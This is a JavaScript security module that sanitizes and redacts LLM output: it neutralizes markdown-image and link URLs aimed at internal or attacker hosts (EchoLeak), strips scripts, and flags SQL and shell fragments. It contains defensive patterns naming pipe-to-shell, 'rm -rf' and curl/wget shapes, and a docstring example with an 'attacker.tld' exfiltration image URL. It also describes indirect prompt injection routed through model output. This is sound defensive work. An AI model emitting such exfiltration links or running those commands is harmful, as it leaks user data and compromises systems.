// SPDX-License-Identifier: Apache-2.0
// Copyright (c) blamejs contributors
"use strict";
/**
 * @module b.ai.output
 * @nav    AI
 * @title  AI Output Handling
 *
 * @intro
 *   Treats LLM output as untrusted, attacker-influenceable data before
 *   it reaches a browser, a downstream fetcher, a SQL / command sink, or
 *   a log. The input gate (b.ai.input.classify) defends the prompt going
 *   in; this defends the model's response coming out. OWASP LLM05:2025
 *   (Improper Output Handling) and LLM02:2025 (Sensitive Information
 *   Disclosure). Under RAG / tool / agentic contexts indirect prompt
 *   injection (OWASP LLM01:2025) routes attacker text from a retrieved
 *   document or web page THROUGH the model and out into the response, so
 *   a "trusted" model is still an attacker-controlled channel — output
 *   handling is defense in depth that never assumes the input gate
 *   caught everything.
 *
 *   `sanitize(text, opts)` neutralizes active markup via b.guardHtml,
 *   gates every markdown image / link and HTML src / href URL through
 *   b.safeUrl + b.ssrfGuard (the EchoLeak markdown-image exfiltration
 *   class, CVE-2025-32711), and FLAGS SQL- / command-shaped fragments
 *   rather than silently repairing them. `redact(text, opts)` strips PII
 *   and secret disclosures via b.redact's detector chain plus an
 *   entity-selectable pass. Both treat the model response as hostile by
 *   default; sanitize is best-effort per the guard-family KIND
 *   discipline (refuse / flag over repair for executable sinks).
 *
 * @card
 *   LLM output handling — neutralizes XSS / DOM injection, gates markdown-image and link URLs against SSRF / EchoLeak exfiltration, flags SQL- / command-shaped fragments, and redacts PII / secret disclosures before model output is rendered, fetched, or logged. OWASP LLM05:2025 + LLM02:2025.
 */

var net = require("node:net");

var C = require("./constants");
var codepointClass = require("./codepoint-class");
var numericBounds = require("./numeric-bounds");
var audit = require("./audit");
var guardHtml = require("./guard-html");
var safeUrl = require("./safe-url");
var ssrfGuard = require("./ssrf-guard");
var redact = require("./redact");
var safeSql = require("./safe-sql");
var { AiOutputError } = require("./framework-error");

var SAMPLE_TRUNC = 80;                                                                       // sample truncation length in chars, not bytes
var DEFAULT_MAX_BYTES = C.BYTES.kib(64);

// Neutral placeholder substituted for a dropped URL in markdown / HTML.
// Renders inert in every sink (browser, markdown renderer, link
// preview) — about:blank is the canonical inert navigation target.
var NEUTRALIZED_URL = "about:blank#blocked";

// Markdown image (![alt](url)) and link ([text](url)) URL extractors, plus
// reference-style definitions ([id]: url) so EchoLeak reference-link payloads
// don't slip past. Each yields the raw URL token — everything up to the first
// whitespace or ")" — with the offset it sits at, because the caller splices
// at that EXACT offset: when a markdown alt text equals its target URL
// (`![u](u)`), locating the URL by searching the matched text would hit the
// alt-text copy and leave the real exfiltration target intact.
//
// Scanned rather than matched. The equivalent patterns had no start anchor, so
// each restarted at every "[" and a run of them cost time proportional to the
// square of the input until the bracket bound took over. The bounds below are
// the same ones those patterns carried, and the scans select the same text.
var MD_ALT_MAX = 2048;             // characters of alt text between [ and ]
var MD_GAP_MAX = 256;              // whitespace between ( and the URL

function _isMdSpace(ch) {
  return codepointClass.inRanges(ch.charCodeAt(0), codepointClass.WHITESPACE_RANGES);
}

// Where the next "]" is, from every index, in one backward pass. Both scans
// below need it, and searching per opening bracket is what makes either of
// them quadratic: text that is a run of "[" with no "]" re-reads the whole
// suffix from each one.
function _nextCloseTable(text) {
  var len = text.length;
  var table = new Int32Array(len + 1);
  table[len] = -1;
  for (var i = len - 1; i >= 0; i -= 1) {
    table[i] = text.charCodeAt(i) === 0x5D ? i : table[i + 1];
  }
  return table;
}

// `![alt](url` when `wantBang`, `[text](url` when not. Matches are
// non-overlapping and the scan resumes after each URL, as a global pattern
// does.
function _findBracketUrls(text, wantBang) {
  var out = [];
  var len = text.length;
  var i = 0;
  // Where the next "]" is, from every index, worked out in one backward pass
  // the first time a "[" turns up.
  //
  // Searching for it per "[" is what makes this quadratic, whichever way the
  // search is written: a bounded lookahead re-reads up to MD_ALT_MAX
  // characters from every one, and an unbounded one re-reads the whole
  // suffix. A run of "[" before a distant "]" is the shape that finds it.
  var nextClose = null;
  while (i < len) {
    var open = text.indexOf("[", i);
    if (open === -1) return out;
    var hasBang = open > 0 && text.charAt(open - 1) === "!";
    if (wantBang ? !hasBang : hasBang) { i = open + 1; continue; }
    if (nextClose === null) nextClose = _nextCloseTable(text);
    // The first "]" is the one a run of non-"]" characters reaches, since
    // such a run cannot cross one.
    var close = nextClose[open + 1];
    if (close === -1) return out;                     // nothing closes from here on
    if (close - (open + 1) > MD_ALT_MAX) { i = open + 1; continue; }
    if (text.charAt(close + 1) !== "(") { i = open + 1; continue; }
    var k = close + 2;
    var gapEnd = Math.min(len, k + MD_GAP_MAX);
    while (k < gapEnd && _isMdSpace(text.charAt(k))) k += 1;
    var u = k;
    while (u < len && text.charAt(u) !== ")" && !_isMdSpace(text.charAt(u))) u += 1;
    if (u === k) { i = open + 1; continue; }
    out.push({ url: text.slice(k, u), start: k });
    i = u;
  }
  return out;
}

// A JavaScript line terminator, the set the `m` flag starts a line after:
// line feed, carriage return, and the two Unicode separators. A CRLF pair is
// one boundary, not two.
function _isLineTerminator(code) {
  return code === 0x0A || code === 0x0D || code === 0x2028 || code === 0x2029;
}

// `[id]: url` at the head of a line, under at most three spaces of indent.
//
// Lines are found by the same rule the `m` flag uses. Splitting on "\n" alone
// left `safe\r[id]: <metadata host>` unrecognized, and a carriage return is a
// line boundary to the pattern this replaced.
function _findRefUrls(text) {
  var out = [];
  var len = text.length;
  var lineStart = 0;
  var consumedTo = 0;
  // Built on the first line that opens a bracket. Searching for the closing
  // one per line re-read the whole suffix from each, so output that is a run
  // of lines beginning "[" with no "]" anywhere cost time proportional to its
  // square.
  var nextClose = null;
  for (;;) {
    var nl = -1;
    for (var scan = lineStart; scan < len; scan += 1) {
      if (_isLineTerminator(text.charCodeAt(scan))) { nl = scan; break; }
    }
    var lineEnd = nl === -1 ? len : nl;
    if (lineStart >= consumedTo) {
      var p = lineStart;
      var indent = 0;
      while (p < lineEnd && indent < 3 &&
             (text.charAt(p) === " " || text.charAt(p) === "\t")) { p += 1; indent += 1; }
      if (text.charAt(p) === "[") {
        // The label runs to the first "]" wherever that is, INCLUDING across
        // a line break: the run it replaces was "any character but ]", which
        // a newline satisfies. Restricting it to the line let
        // `[a\nb]: http://169.254.169.254/x` through, which is exactly the
        // reference-style payload this extractor exists to catch.
        if (nextClose === null) nextClose = _nextCloseTable(text);
        var close = nextClose[p + 1];
        if (close > p + 1 && text.charAt(close + 1) === ":") {
          var k = close + 2;
          while (k < len && _isMdSpace(text.charAt(k))) k += 1;
          var u = k;
          while (u < len && !_isMdSpace(text.charAt(u))) u += 1;
          if (u > k) { out.push({ url: text.slice(k, u), start: k }); consumedTo = u; }
        }
      }
    }
    if (nl === -1) return out;
    // CRLF is one boundary: the next line starts after the pair.
    lineStart = (text.charCodeAt(nl) === 0x0D && text.charCodeAt(nl + 1) === 0x0A)
      ? nl + 2
      : nl + 1;
  }
}
// HTML src= / href= attribute URL extractor — the guardHtml pass already
// strips dangerous markup, but a surviving same-origin-looking src that
// points at an internal / metadata host must still be neutralized for
// the auto-fetch exfiltration class.
var HTML_URL_ATTR_RE = /\b(?:src|href)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^"'>\s]+))/dgi;

// SQL-shaped fragment signal. Composes safe-sql's reserved-word stance:
// a leading SQL keyword followed by a clause keyword is the executable
// shape, and each candidate keyword is confirmed against
// safeSql.validateIdentifier (which REFUSES reserved words — a word that
// throws there is a SQL reserved word, not a plain identifier). We FLAG,
// never repair — a sanitized-but-still-executed query is a false sense
// of safety; the v1 posture is flag-and-let-the-operator-refuse.
var SQL_SHAPE_RE = /\b([A-Za-z]+)\b[\s\S]{0,40}\b(?:from|into|table|where|set|values|database|schema|--|;)\b/i;
// Command-shaped fragment: shell metacharacters around a binary, or an
// inline substitution / pipe-to-shell shape. Flag-only, same posture.
var CMD_SHAPE_RE = /(?:\$\(|`|\|\s*(?:sh|bash|zsh|cmd|powershell)\b|;\s*rm\s+-rf?\b|&&\s*curl\b|\bwget\b[\s\S]{0,40}\|\s*(?:sh|bash)\b)/i;

// A word is a SQL reserved word iff safeSql.validateIdentifier refuses
// it (it bans SELECT / DROP / UNION / EXEC / PRAGMA / ATTACH / … as
// unsafe identifiers). Composing the validator means the reserved-word
// list lives in one place (safe-sql), not duplicated here.
function _isSqlReservedWord(word) {
  try {
    safeSql.validateIdentifier(word);
    return false;   // accepted as a plain identifier → not reserved
  } catch (_e) {
    return true;    // refused → reserved keyword (or otherwise unsafe)
  }
}

// Detect a SQL-executable shape: a reserved leading verb that the
// safe-sql validator refuses, followed by a clause keyword. Returns the
// matched fragment or null.
function _detectSqlShape(text) {
  var m = SQL_SHAPE_RE.exec(text);
  if (!m) return null;
  return _isSqlReservedWord(m[1]) ? m[0] : null;
}

// Entity → safe-sql/redact CLASSIFIER_PATTERNS subset for redact(). The
// operator picks entities (email / phone / ssn / pan / …); we map them
// onto redact.js's owned detector chain rather than re-deriving Luhn /
// SSN / PAN / JWT regexes here.
var ENTITY_PATTERNS = Object.freeze({
  "pan":   ["pan"],
  "ssn":   ["ssn"],
  "ein":   ["ein"],
  "iban":  ["iban"],
  "jwt":   ["jwt"],
  "aws":   ["aws-access-key"],
  "phi":   ["phi-shape"],
  // email / phone aren't in redact's CLASSIFIER_PATTERNS (they're
  // value-detector territory); handled below via dedicated shape rules
  // that compose redact's MARKER so the placeholder is uniform.
  "email": [],
  "phone": [],
});

// Email / phone shape rules — applied as in-string replacements so a
// disclosure embedded mid-sentence in model prose is scrubbed, not just
// a whole-field match. Marker is redact.js's MARKER for uniformity.
var EMAIL_RE = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g;
var PHONE_RE = /(?:\+?\d{1,3}[\s.-]?)?(?:\(\d{2,4}\)[\s.-]?)?\d{3}[\s.-]?\d{3,4}\b/g;

function _featuresOf(text) {
  return {
    length: text.length,
    lines:  text.split("\n").length,
  };
}

// Walk a regex with a single URL capture group; call onUrl(url) for
// each match and, when onUrl returns a replacement string, splice it in.
// Returns the possibly-rewritten text.
// `find(text)` returns every URL the extractor sees as `{ url, start }`, in
// order. Splicing uses `start` rather than searching the matched text for the
// URL: when a markdown alt text equals its target URL, a search would hit the
// alt copy and leave the real URL intact (EchoLeak).
function _rewriteUrls(text, find, onUrl) {
  var found = find(text);
  var out = "";
  var last = 0;
  for (var i = 0; i < found.length; i += 1) {
    var url = found[i].url;
    if (!url) continue;
    var replacement = onUrl(url);
    if (replacement === null || replacement === url) continue;
    var idx = found[i].start;
    if (idx < last) continue;                       // already rewritten
    out += text.slice(last, idx) + replacement;
    last = idx + url.length;
  }
  return last === 0 ? text : out + text.slice(last);
}

// The HTML attribute extractor still matches; it is bounded by the quote or
// `>` that ends the value and does not run away. This adapts it to the same
// `{ url, start }` shape the scans above produce.
function _findAttrUrls(text) {
  HTML_URL_ATTR_RE.lastIndex = 0;
  var out = [];
  var m;
  while ((m = HTML_URL_ATTR_RE.exec(text)) !== null) {
    var g = m[1] !== undefined ? 1 : (m[2] !== undefined ? 2 : (m[3] !== undefined ? 3 : 0));
    if (g && m[g]) {
      var span = m.indices && m.indices[g];
      out.push({
        url:   m[g],
        start: span ? span[0] : m.index + m[0].lastIndexOf(m[g]),
      });
    }
    if (HTML_URL_ATTR_RE.lastIndex === m.index) HTML_URL_ATTR_RE.lastIndex += 1;
  }
  return out;
}

// Decide whether a URL extracted from model output is safe to keep. The
// scheme / credential gate is b.safeUrl.parse (HTTPS-only by default,
// refuses data: / file: / javascript: / ftp: and user:pass@); the
// IP-range gate is b.ssrfGuard.classify on the host when it's an IP
// literal (loopback / private / link-local / reserved / cloud-metadata).
// Returns { keep: bool, reason: string|null }. Sync — sanitize mirrors
// the ai-input shape; hostname DNS resolution (b.ssrfGuard.checkUrl) is
// async and left to the operator's downstream fetcher, which the docs
// direct to b.httpClient (SSRF-pinned).
function _urlVerdict(url) {
  var parsed;
  try {
    parsed = safeUrl.parse(url, { allowedProtocols: safeUrl.ALLOW_HTTP_TLS });
  } catch (_e) {
    return { keep: false, reason: "scheme-or-credential-refused" };
  }
  var host = (parsed.hostname || "").replace(/^\[|\]$/g, "");
  if (host && net.isIP(host)) {
    var cls = ssrfGuard.classify(host);
    if (cls !== null) {
      return { keep: false, reason: "ssrf-" + cls };
    }
  }
  return { keep: true, reason: null };
}

/**
 * @primitive b.ai.output.sanitize
 * @signature b.ai.output.sanitize(text, opts?)
 * @since     0.14.11
 * @status    stable
 * @compliance gdpr, soc2
 * @related   b.ai.output.redact, b.ai.input.classify, b.guardHtml.sanitize, b.ssrfGuard.classify, b.safeUrl.parse
 *
 * Treat an LLM response as untrusted output and neutralize the four
 * sink-injection classes before it is rendered, fetched, or executed.
 * Active markup (script / event-handlers / dangerous URL schemes) is
 * stripped via `b.guardHtml.sanitize`; every markdown image / link and
 * HTML `src` / `href` URL is gated through `b.safeUrl.parse` (scheme +
 * credential) and `b.ssrfGuard.classify` (IP-range), so auto-fetch URLs
 * to attacker or internal / cloud-metadata hosts are neutralized — the
 * EchoLeak zero-click markdown-image exfiltration class
 * ([CVE-2025-32711](https://nvd.nist.gov/vuln/detail/CVE-2025-32711),
 * CVSS 9.3). SQL- and command-shaped fragments are FLAGGED, never
 * repaired (a sanitized-but-executed query is a false sense of safety —
 * sanitize is best-effort per the guard-family discipline). Returns
 * `{ text, verdict, signals, features }` where `text` is the sanitized
 * output, `verdict` is `clean` / `sanitized` / `flagged`, and `signals`
 * lists each neutralization or flag. OWASP LLM05:2025.
 *
 * @opts
 *   maxBytes:     number,       // default 64 KiB; throws on overflow
 *   htmlProfile:  string,       // b.guardHtml profile; default "strict"
 *   sqlShape:     boolean,      // flag SQL-shaped fragments; default true
 *   commandShape: boolean,      // flag command-shaped fragments; default true
 *   audit:        boolean,      // default true; emit aioutput.sanitize on non-clean
 *   errorClass:   ErrorClass,   // override the thrown class on bad input
 *
 * @example
 *   var out = b.ai.output.sanitize(
 *     "Here you go ![x](https://attacker.tld/?s=SECRET) <script>steal()</script>");
 *   out.verdict;                                   // → "sanitized"
 *   out.text.indexOf("<script>");                  // → -1
 *   out.signals.some(function (s) { return s.id === "url-neutralized"; }); // → true
 */
function sanitize(text, opts) {
  opts = opts || {};
  var errorClass = opts.errorClass || AiOutputError;
  numericBounds.requirePositiveFiniteIntIfPresent(opts.maxBytes, "aiOutput.sanitize: opts.maxBytes", errorClass, "ai-output/bad-max-bytes");
  var maxBytes = opts.maxBytes || DEFAULT_MAX_BYTES;
  var auditOn = opts.audit !== false;
  var htmlProfile = typeof opts.htmlProfile === "string" ? opts.htmlProfile : "strict";
  var sqlShape = opts.sqlShape !== false;
  var commandShape = opts.commandShape !== false;

  if (typeof text !== "string") {
    throw errorClass.factory("ai-output/bad-input",
      "aiOutput.sanitize: text must be a string");
  }
  var byteLen = Buffer.byteLength(text, "utf8");
  if (byteLen > maxBytes) {
    throw errorClass.factory("ai-output/output-too-large",
      "aiOutput.sanitize: output exceeds " + maxBytes + " bytes (got " + byteLen + ")");
  }

  var signals = [];
  var out = text;

  // 1. URL gate FIRST (before HTML rewrite) so markdown / HTML URLs that
  //    point at internal / metadata / non-HTTPS hosts are neutralized
  //    even when the surrounding markup is otherwise benign.
  function _gateUrl(url) {
    var v = _urlVerdict(url);
    if (v.keep) return null;
    signals.push({ id: "url-neutralized", severity: 3, sample: url.slice(0, SAMPLE_TRUNC), reason: v.reason });
    return NEUTRALIZED_URL;
  }
  out = _rewriteUrls(out, function (t) { return _findBracketUrls(t, true); }, _gateUrl);
  out = _rewriteUrls(out, function (t) { return _findBracketUrls(t, false); }, _gateUrl);
  out = _rewriteUrls(out, _findRefUrls, _gateUrl);
  out = _rewriteUrls(out, _findAttrUrls, _gateUrl);

  // 2. Active-markup neutralization via guardHtml — strips script /
  //    event-handlers / body-drop tags / off-allowlist schemes. Reuse
  //    guardHtml's tokenizer + denylists; never re-derive them here.
  var afterHtml = guardHtml.sanitize(out, { profile: htmlProfile });
  if (afterHtml !== out) {
    signals.push({ id: "html-neutralized", severity: 3, sample: null });
  }
  out = afterHtml;

  // 3. SQL- / command-shape FLAG (no repair — best-effort posture for
  //    executable sinks). Composes safe-sql's reserved-word stance.
  if (sqlShape) {
    var sqlMatch = _detectSqlShape(out);
    if (sqlMatch) {
      signals.push({ id: "sql-shape-flagged", severity: 2, sample: sqlMatch.slice(0, SAMPLE_TRUNC) });
    }
  }
  if (commandShape && CMD_SHAPE_RE.test(out)) {   // allow:regex-no-length-cap — `out` is byte-bounded to maxBytes (64 KiB default) at function entry; this is a flag-only signal, not a format validator
    var cm = out.match(CMD_SHAPE_RE);
    signals.push({ id: "command-shape-flagged", severity: 2, sample: cm ? cm[0].slice(0, SAMPLE_TRUNC) : null });
  }

  var sev3 = 0;
  for (var i = 0; i < signals.length; i += 1) {
    if (signals[i].severity === 3) sev3 += 1;
  }
  // sanitized = we actively neutralized markup/URL (sev-3 mutation);
  // flagged = only flag-only signals (sql/command) fired; clean = none.
  var verdict = sev3 > 0 ? "sanitized" : (signals.length > 0 ? "flagged" : "clean");

  if (auditOn && verdict !== "clean") {
    audit.safeEmit({
      action:   "aioutput.sanitize",
      outcome:  "success",
      metadata: {
        verdict:   verdict,
        signalIds: signals.map(function (s) { return s.id; }),
        length:    out.length,
      },
    });
  }

  return {
    text:     out,
    verdict:  verdict,
    signals:  signals,
    features: _featuresOf(out),
  };
}

/**
 * @primitive b.ai.output.redact
 * @signature b.ai.output.redact(text, opts?)
 * @since     0.14.11
 * @status    stable
 * @compliance gdpr, soc2, hipaa, pci-dss
 * @related   b.ai.output.sanitize, b.redact.redact, b.redact.classifyDefaults
 *
 * Strip PII and secret disclosures from an LLM response before it is
 * logged, returned, or rendered — the model regurgitates training-data
 * PII, echoes secrets pulled into context, or leaks other-tenant /
 * system-prompt content (OWASP LLM02:2025 Sensitive Information
 * Disclosure; NIST AI 600-1 Data Privacy + Information Security). The
 * always-on secret pass composes `b.redact.redact` — Luhn-validated
 * PAN, JWS triplets, PEM / OpenSSH private keys, AWS key prefixes,
 * vault-sealed ciphertext, connection-string credentials. The
 * entity-selectable PII pass (`opts.entities`) maps onto
 * `b.redact.CLASSIFIER_PATTERNS` for `pan` / `ssn` / `ein` / `iban` /
 * `jwt` / `aws` / `phi`, plus in-string `email` / `phone` shape rules,
 * all substituting the framework marker. Returns
 * `{ text, redacted, hits }` where `text` is the scrubbed output,
 * `redacted` is whether anything changed, and `hits` lists each entity
 * class that fired. Never mutates the input.
 *
 * @opts
 *   entities:    string[],     // subset of: pan, ssn, ein, iban, jwt, aws, phi, email, phone
 *   secrets:     boolean,      // run the always-on b.redact secret pass; default true
 *   marker:      string,       // replacement marker; default b.redact.MARKER
 *   maxBytes:    number,       // default 64 KiB; throws on overflow
 *   audit:       boolean,      // default true; emit aioutput.redact when hits fire
 *   errorClass:  ErrorClass,   // override the thrown class on bad input
 *
 * @example
 *   var out = b.ai.output.redact(
 *     "Contact alice@corp.example or card 4111 1111 1111 1111",
 *     { entities: ["email", "pan"] });
 *   out.redacted;   // → true
 *   out.hits;       // → ["email", "pan"]
 *   out.text;       // → "Contact [REDACTED] or card [REDACTED]"
 */
function redactOutput(text, opts) {
  opts = opts || {};
  var errorClass = opts.errorClass || AiOutputError;
  numericBounds.requirePositiveFiniteIntIfPresent(opts.maxBytes, "aiOutput.redact: opts.maxBytes", errorClass, "ai-output/bad-max-bytes");
  var maxBytes = opts.maxBytes || DEFAULT_MAX_BYTES;
  var auditOn = opts.audit !== false;
  var marker = typeof opts.marker === "string" && opts.marker.length > 0 ? opts.marker : redact.MARKER;
  var runSecrets = opts.secrets !== false;

  if (typeof text !== "string") {
    throw errorClass.factory("ai-output/bad-input",
      "aiOutput.redact: text must be a string");
  }
  var byteLen = Buffer.byteLength(text, "utf8");
  if (byteLen > maxBytes) {
    throw errorClass.factory("ai-output/output-too-large",
      "aiOutput.redact: output exceeds " + maxBytes + " bytes (got " + byteLen + ")");
  }

  var entities = Array.isArray(opts.entities) ? opts.entities : [];
  for (var e = 0; e < entities.length; e += 1) {
    if (typeof entities[e] !== "string" || !Object.prototype.hasOwnProperty.call(ENTITY_PATTERNS, entities[e])) {
      throw errorClass.factory("ai-output/unknown-entity",
        "aiOutput.redact: unknown entity '" + entities[e] +
        "'. Known: " + Object.keys(ENTITY_PATTERNS).join(", "));
    }
  }

  var hits = [];
  var out = text;

  // Always-on secret pass — b.redact.redact owns the Luhn / PEM / SSH /
  // AWS / JWS / vault-sealed / connection-string detector chain. We seed
  // parentKey so a bare secret string at the top level is value-scanned.
  if (runSecrets) {
    var scrubbed = redact.redact(out, { marker: marker });
    if (scrubbed !== out) hits.push("secrets");
    out = typeof scrubbed === "string" ? scrubbed : out;
  }

  // Entity-selectable PII pass. CLASSIFIER_PATTERNS-backed entities run
  // a detect() over the whole string and, on a hit, scrub the matched
  // shape; email / phone run their in-string shape rules.
  for (var i = 0; i < entities.length; i += 1) {
    var ent = entities[i];
    var fired = false;
    var patternNames = ENTITY_PATTERNS[ent];
    for (var p = 0; p < patternNames.length; p += 1) {
      var spec = redact.CLASSIFIER_PATTERNS[patternNames[p]];
      if (spec && spec.detect(out)) {
        out = _scrubEntity(out, patternNames[p], marker);
        fired = true;
      }
    }
    if (ent === "email") {
      if (EMAIL_RE.test(out)) { out = out.replace(EMAIL_RE, marker); fired = true; }   // allow:regex-no-length-cap — `out` byte-bounded to maxBytes at entry; in-string scrub, not a format validator
    } else if (ent === "phone") {
      if (PHONE_RE.test(out)) { out = out.replace(PHONE_RE, marker); fired = true; }   // allow:regex-no-length-cap — `out` byte-bounded to maxBytes at entry; in-string scrub, not a format validator
    }
    if (fired) hits.push(ent);
  }

  if (auditOn && hits.length > 0) {
    audit.safeEmit({
      action:   "aioutput.redact",
      outcome:  "success",
      metadata: { hits: hits, length: out.length },
    });
  }

  return {
    text:     out,
    redacted: hits.length > 0,
    hits:     hits,
  };
}

// In-string scrub for a CLASSIFIER_PATTERNS-backed entity. The detector
// chain in redact.js owns whole-value matching; here we apply the same
// shape as an in-string replace so a disclosure embedded mid-prose is
// scrubbed. Each branch uses the SAME regex shape redact.js's detector
// uses — composing the validated pattern, not re-deriving it.
function _scrubEntity(str, patternName, marker) {
  switch (patternName) {
    case "pan":
    case "iban":
      // PAN / IBAN: replace runs that the detector would Luhn / mod-97
      // validate as whole strings. The full-string detector already
      // confirmed presence; replace the digit-run shape.
      return str.replace(/\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{1,7}\b/g, marker)
                .replace(/\b[A-Z]{2}\d{2}[A-Z0-9]{11,30}\b/g, marker);
    case "ssn":
      return str.replace(/\b\d{3}-\d{2}-\d{4}\b/g, marker);
    case "ein":
      return str.replace(/\b\d{2}-\d{7}\b/g, marker);
    case "jwt":
      return str.replace(/\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b/g, marker);
    case "aws-access-key":
      return str.replace(/\b(?:AKIA|ASIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASCA)[A-Z0-9]{16}\b/g, marker);
    case "phi-shape":
      return str.replace(/\b\d{3}-\d{2}-\d{4}\b/g, marker)
                .replace(/\bMRN[:#]?\s*\d{4,12}\b/gi, marker);
    default:
      return str;
  }
}

module.exports = {
  sanitize:    sanitize,
  redact:      redactOutput,
  ENTITIES:    Object.freeze(Object.keys(ENTITY_PATTERNS)),
  AiOutputError: AiOutputError,
};
